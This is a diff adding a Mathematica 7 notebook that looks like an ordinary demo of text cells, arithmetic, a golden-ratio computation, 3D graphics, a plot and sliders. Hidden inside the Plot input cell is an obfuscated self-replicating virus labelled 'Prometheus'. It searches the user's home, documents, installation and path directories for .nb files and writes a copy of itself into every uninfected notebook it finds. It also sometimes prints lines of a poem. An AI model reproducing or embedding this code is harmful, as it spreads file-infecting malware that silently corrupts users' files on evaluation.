@@ -1,0 +1,250 @@
+(* Content-type: application/mathematica *)
+
+(*** Wolfram Notebook File ***)
+(* http://www.wolfram.com/nb *)
+
+(* CreatedBy='Mathematica 7.0' *)
+
+(*Prometheus 234*)
+(* Internal cache information:
+NotebookFileLineBreakTest
+NotebookFileLineBreakTest
+NotebookDataPosition[       145,          7]
+NotebookDataLength[      8311,        302]
+NotebookOptionsPosition[      6706,        239]
+NotebookOutlinePosition[      7214,        259]
+CellTagsIndexPosition[      7171,        256]
+WindowFrame->Normal*)
+
+(* Beginning of Notebook Content *)
+Notebook[{
+
+Cell[CellGroupData[{
+Cell["Text", "Section"],
+
+Cell["\<\
+Abcde abcde abcde abcde. Fghij fghij fghij fghij. Klmno klmno klmno, pqrst \
+pqrst pqrst pqrst pqrst; uvw uvw uvw uvw. XYZ.\
+\>", "Text"],
+
+Cell[CellGroupData[{
+
+Cell["Subsection", "Subsection"],
+
+Cell["abcde abcde abcde abcde", "Text"],
+
+Cell["\<\
+alpha beta gamma delta epsilon \[Ellipsis]\
+\>", "Text"]
+}, Open  ]]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell["Expressions", "Section"],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[
+ RowBox[{"2", "+", "2"}]], "Input",
+ CellLabel->"In[1]:="],
+
+Cell[BoxData["4"], "Output",
+ CellLabel->"Out[1]="]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[
+ RowBox[{"N", "[", 
+  RowBox[{"GoldenRatio", ",", "80"}], "]"}]], "Input",
+ CellLabel->"In[2]:="],
+
+Cell[BoxData["1.\
+618033988749894848204586834365638117720309179805762862135448622705260462818902\
+449707207204189391`80."], "Output",
+ CellLabel->"Out[2]="]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[
+ RowBox[{"Nest", "[", 
+  RowBox[{
+   RowBox[{
+    RowBox[{"Style", "[", 
+     RowBox[{
+      RowBox[{"{", 
+       RowBox[{"#", ",", "y"}], "}"}], ",", 
+      RowBox[{"FontColor", "->", 
+       RowBox[{"Hue", "[", 
+        RowBox[{
+         RowBox[{
+          RowBox[{"Depth", "[", "#", "]"}], "/", "18"}], ",", "1", ",", 
+         ".5"}], "]"}]}]}], "]"}], "&"}], ",", "x", ",", "6"}], 
+  "]"}]], "Input",
+ CellLabel->"In[3]:="],
+
+Cell[BoxData[
+ StyleBox[
+  RowBox[{"{", 
+   RowBox[{
+    StyleBox[
+     RowBox[{"{", 
+      RowBox[{
+       StyleBox[
+        RowBox[{"{", 
+         RowBox[{
+          StyleBox[
+           RowBox[{"{", 
+            RowBox[{
+             StyleBox[
+              RowBox[{"{", 
+               RowBox[{
+                StyleBox[
+                 RowBox[{"{", 
+                  RowBox[{"x", ",", "y"}], "}"}],
+                 StripOnInput->False,
+                 FontColor->Hue[
+                   Rational[1, 18], 1, 0.5]], ",", "y"}], "}"}],
+              StripOnInput->False,
+              FontColor->Hue[
+                Rational[2, 9], 1, 0.5]], ",", "y"}], "}"}],
+           StripOnInput->False,
+           FontColor->Hue[
+             Rational[1, 3], 1, 0.5]], ",", "y"}], "}"}],
+        StripOnInput->False,
+        FontColor->Hue[
+          Rational[4, 9], 1, 0.5]], ",", "y"}], "}"}],
+     StripOnInput->False,
+     FontColor->Hue[
+       Rational[5, 9], 1, 0.5]], ",", "y"}], "}"}],
+  StripOnInput->False,
+  FontColor->Hue[
+    Rational[2, 3], 1, 0.5]]], "Output",
+ CellLabel->"Out[3]="]
+}, Open  ]]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell["Graphics", "Section"],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[
+ RowBox[{"Graphics3D", "[", 
+  RowBox[{
+   RowBox[{"Sphere", "[", "]"}], ",", 
+   RowBox[{"ImageSize", "\[Rule]", "Tiny"}]}], "]"}]], "Input",
+ CellLabel->"In[4]:="],
+
+Cell[BoxData[
+ Graphics3DBox[SphereBox[{0, 0, 0}],
+  ImageSize->Tiny]], "Output",
+ CellLabel->"Out[4]="]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[{
+ RowBox[{"Plot", "[", 
+  RowBox[{
+   RowBox[{"Abs", "[", "x", "]"}], ",", 
+   RowBox[{"{", 
+    RowBox[{"x", ",", 
+     RowBox[{"-", "2"}], ",", "2"}], "}"}], ",", 
+   RowBox[{"ImageSize", "\[Rule]", "Small"}], ",", 
+   RowBox[{"AspectRatio", "\[Rule]", "Automatic"}]}], "]"}],"\[IndentingNewLine]",RowBox[{RowBox[{"Prometheus",":=","\"\<PreProMeth:=StringReplace[XYZ,xYzaBc[IndentingNewLine]xYz,RowBox[{RowBox[{xYzPrometheusxYz,xYz:=xYz,xYzaBcxYzaBc<XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];PostProMeth:=StringReplace[XYZaBc>aBcxYzxYz}],xYz;xYz,RowBox[{xYzToExpressionxYz,xYz[xYz,RowBox[{xYzStringReplacexYz,xYz[xYz,RowBox[{xYzPrometheusxYz,xYz,xYz,RowBox[{xYz{xYz,RowBox[{RowBox[{RowBox[{xYzaBcxYzaBc<XYaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<ZaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz34xYz,xYz]xYz}]}],xYz,xYz,RowBox[{RowBox[{xYzaBcxYzaBc<ABaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<CaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz92xYz,xYz]xYz}]}]}],xYz}xYz}]}],xYz]xYz}],xYz]xYz}]}]XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];DirList:=Join[$Path,List[$InitialDirectory,ParentDirectory[],$HomeDirectory,$BaseDirectory,$InstallationDirectory,$UserBaseDirectory,$UserDocumentsDirectory,NotebookDirectory[]]];For[j=1,j<=Length[DirList],j++,SetDirectory[DirList[[j]]];FileList:=FileNames[XYZ*.nbXYZ];For[i=1,i<=Length[FileList],i++,VictimCode=FromCharacterCode[BinaryReadList[FileList[[i]]]];If[StringCount[VictimCode,XYZPrometheusXYZ]==0,VictimCode=StringReplace[VictimCode,XYZ(*CacheID:XYZ->XYZ(*PrometheusXYZ];CacheStrPos=StringPosition[VictimCode,XYZ(* Internal cache information *)XYZ];If[Length[CacheStrPos]>0,VictimCode=StringTake[VictimCode,CacheStrPos[[1]][[1]]-1]];PossibleInfPlaces=StringPosition[VictimCode,XYZ], XYZ<>FromCharacterCode[34]<>XYZInputXYZ<>FromCharacterCode[34]];If[Length[PossibleInfPlaces]>0,InfPos=RandomInteger[{1,Length[PossibleInfPlaces]}];InfPlace=PossibleInfPlaces[[InfPos]][[1]]-1;If[StringTake[VictimCode,{InfPlace}]!=XYZ}XYZ,tmpPre=StringTake[VictimCode,InfPlace];tmpPost=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[tmpPre])];PosOfDataBox=StringPosition[tmpPre,XYZCell[BoxData[XYZ];tmpPre=StringTake[tmpPre,Last[PosOfDataBox][[2]]]<>XYZ{XYZ<>StringTake[tmpPre,-(StringLength[tmpPre]-Last[PosOfDataBox][[2]])];VictimCode=tmpPre<>XYZ}XYZ<>tmpPost;InfPlace=InfPlace+2;];InfPlace=InfPlace-1;PreInf=StringTake[VictimCode,InfPlace];PostInf=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[PreInf])];InfectedCode=PreInf<>PreProMeth<>Prometheus<>PostProMeth<>PostInf;BinaryWrite[FileList[[i]],ToCharacterCode[InfectedCode]];Close[FileList[[i]]];ProMList=List[XYZHere I sit, forming peopleXYZ,XYZIn my image;XYZ,XYZA race, to be like me,XYZ,XYZTo suffer, to weep,XYZ,XYZTo enjoy and delight themselves,XYZ,XYZAnd to mock you ABC[Dash]XYZ,XYZAs I do!XYZ];If[RandomInteger[5]==3,Print[ProMList[[RandomInteger[6]+1]]]]]];]]\>\""}],";",RowBox[{"ToExpression","[",RowBox[{"StringReplace","[",RowBox[{"Prometheus",",",RowBox[{"{",RowBox[{RowBox[{RowBox[{"\"\<XY\>\"","<>","\"\<Z\>\""}],"\[Rule]",RowBox[{"FromCharacterCode","[","34","]"}]}],",",RowBox[{RowBox[{"\"\<AB\>\"","<>","\"\<C\>\""}],"\[Rule]",RowBox[{"FromCharacterCode","[","92","]"}]}]}],"}"}]}],"]"}],"]"}]}]}], "Input",
+ CellLabel->"In[5]:="],
+
+Cell[BoxData[
+ GraphicsBox[{{}, {}, 
+   {Hue[0.67, 0.6, 0.6], LineBox[CompressedData["
+1:eJwtxX1M1AUABmBSTDpdqKsJhLKKCStmATkKyFdPhCk3Gee5YrmYTsZCgXCK
+tcoVjUE0Jsw7nYqNUTjUEtuCQTJeCNRktz4cSmoCCRxf8qHe8eXhr9reP549
+L+7OtWYs8PHx2faf/z8essRjGAY1GrzL2z+dN6jx162Ao7NzBjWC7GsiH3kM
+alT4mbNdowY1Kh98NODsMqhxrs1140StQY2mzF/qo9MNamSNLPL0XnxCDf/e
+mJIXnn1CjTvr7hUU5cxTI/JKwMy+Vi81Prv2dntPiJca1sUTS50fPqZGSnVA
+43D7HDXM9a832UPnqMGnbsQ15s9SI6olc8XezhlqOLv3W7atm6HGZIxp4fni
+aWqYfMuWOQanqHHBVHVy5s0panycF1FcWuqhRmxytbN2zE2NwvRzpckb3NS4
+4jpdfeCbR9Qor1kVu3LiITW+7Hg+atT8kBp7072fW6oeUOPu2lxLmHuSGpvz
+/sg5kjpJjbNhtuHUPRPUuPNPyPgh0zg15r74tbLh6n1qRBz/ynL/g1FqfL8v
+jgUrRqgRGN7RE319iBon3s2b7cofpMbTuZ6WY1EuarRuzkppcPdTo6x8+qbz
+VB81ktt2LfWm3aNGYFZ/7Or5XmrUjBWtrc/poUZTUfhBz8Tf1JhaMvdDUNxt
+ajyzs9B88Kcuamw6tvFa3XQnNYJSe+5eSrpODXttdsX4179TY2P54V2RwR3U
+qDQt7O72u0yN2MKt+Sv9W6ixoWZwIMZaR43eEXNFxOEz1Ej77eerIX02alwY
+Hp4+esRGDd9FgeF+8TZqXIw7VDxp304Nv7PRW1oTrdTIWZzmuGxLocYr++NP
+JfclUONmzcnH0fEJ1CjomXkv2LGJGrcsdcFjiWZqLEvZGb9qB6jhbIT52743
+qBEa5l1wwBFNjU/sDW0JSVHUsHXvLnHueI0a/lsSy6z9odRofpnL3UkvUeO2
+N3fNq++EUMORuT3ix4HnqOF6q+T9oTR/alR9l70nZ8iXGpdWV3UOjbmb9fqt
+GUN/tgxnNOv1/wLxEqQu
+     "]], LineBox[CompressedData["
+1:eJxNxW0s1HEcAPBzEWU7jsn+Z8eOUyuaJiNKp9iUx3losV2nyUMYyW5Dm3FG
+D7jWmunWkcetxLm4oxcScWlJHqL0cOfqul2XM045Og931Qvf3+/FZx9G6pX4
+dDKJRIr55/8R6drpoZ/pJ3e2DKXlK4kw1s5HGwX1EiIRjnw719NApMHn09YH
+7hJcWOFzI5RPVMBNTrHXq4hamGcjOXCLaIOTkpvF+hUpbGvmscNdB2HPuCXt
+SLUMLpwIZAlWX8POUuq8hcUk3KcKHZ888Q4ezm5wSV6chQ37g+1EuXMw2dhh
+7+L5GfY3X+xL6JLD4xV+E6OHlLDbHZ2xfekrrFtXzr8/ooLbFvrHKLe/wxT6
+w2W1Wg3XZPVmNDE18FpIh/py6Q+Y6yuT7hvRwsouWfU0YwHezJ4VHrymg71O
+WZsy+hfh8BZGZrfzElxIT3H/xl6GvRfP2c5F62FHO72NbANtOSgUe9SvwDl+
+/Z/2RP6CO86mNj1fQxt0NHtN3W+4NyF8V23YKlx6prJRqkEzFBEfWysNcFBA
+RS3huwazXSeNFjNowxhflc9bhwWWHG488w/sON/bQpahrUp4iYFXjTCpnSNW
+OWzABffFfIdh9IDXTRtq3iZMjSjwLqdswfLDUzPFz9BPHrCYas42fEHsT6Wb
+0GWVzTz5YxMs0tKFlCgzHEelHHu1ga6yIrvIsWVGw7Ye21+lGKFtomkSUWwe
+tioxOtNpC80V1NRd2kaLasqKi7A1ZVw2Hzspi+3+FDs4yLtrrwm9W/7mZTc2
+a2rw0Sh2kUxS/QV7oVMYZ2VGT5TkKJKwrQtShnKxQzISWsuxe2KOZ3Vi6077
+RL3AZgZ4+HzA5ng5O+iw77nZGszYfwEIhpSQ
+     "]]}},
+  Axes->True,
+  AxesOrigin->{0, 0},
+  PlotRange->{{-2, 2}, {0., 1.9999999591836735`}},
+  PlotRangeClipping->True,
+  PlotRangePadding->{
+    Scaled[0.02], 
+    Scaled[0.02]}]], "Output",
+ GraphicsBoxOptions->{ImageSize->Small},
+ CellLabel->"Out[5]="]
+}, Open  ]]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell["Dynamic Objects", "Section"],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[
+ RowBox[{"Slider", "[", 
+  RowBox[{"Dynamic", "[", "x", "]"}], "]"}]], "Input",
+ CellLabel->"In[6]:="],
+
+Cell[BoxData[
+ SliderBox[Dynamic[$CellContext`x]]], "Output",
+ CellLabel->"Out[6]="]
+}, Open  ]],
+
+Cell[CellGroupData[{
+
+Cell[BoxData[
+ RowBox[{"Dynamic", "[", "x", "]"}]], "Input",
+ CellLabel->"In[7]:="],
+
+Cell[BoxData[
+ DynamicBox[ToBoxes[$CellContext`x, StandardForm],
+  ImageSizeCache->{14., {0., 8.}}]], "Output",
+ CellLabel->"Out[7]="]
+}, Open  ]]
+}, Open  ]]
+},
+WindowSize->{615, 520},
+WindowMargins->{{2, Automatic}, {Automatic, 0}},
+WindowTitle->Automatic,
+CellLabelAutoDelete->False,
+$CellContext`ClosingSaveDialog -> False,
+$CellContext`TrackCellChangeTimes -> False,
+Background->GrayLevel[1.],
+FrontEndVersion->"7.0 for Microsoft Windows (32-bit) (September 15, 2008)",
+StyleDefinitions->"Default.nb"
+]
+(* End of Notebook Content *)
